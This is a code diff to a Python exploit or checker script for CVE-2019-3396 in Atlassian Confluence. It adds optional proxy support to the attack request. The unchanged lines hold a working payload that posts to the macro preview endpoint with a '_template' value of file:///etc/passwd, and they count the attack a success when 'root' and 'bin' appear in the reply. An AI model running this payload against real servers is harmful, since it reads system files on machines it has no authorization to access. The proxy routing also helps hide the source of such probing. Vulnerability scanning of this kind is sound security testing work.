@@ -14,7 +14,7 @@ def UrlProcessing(url):
 
 PayloadPost='''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
 Payload="/rest/tinymce/1/macro/preview"
-def CVE_2019_3396(Url,RandomAgent):
+def CVE_2019_3396(Url,RandomAgent,ProxyIp):
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
@@ -41,7 +41,14 @@ def CVE_2019_3396(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.post(PayloadUrl,data=PayloadPost,headers=headers, timeout=5)
+        if ProxyIp!=None:#判断是否需要代理访问
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.post(PayloadUrl,data=PayloadPost,proxies=proxies,headers=headers, timeout=5)
+        elif ProxyIp==None:
+            resp = s.post(PayloadUrl, data=PayloadPost, headers=headers, timeout=5)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('bin')!=-1 and con.lower().find('root')!=-1 :
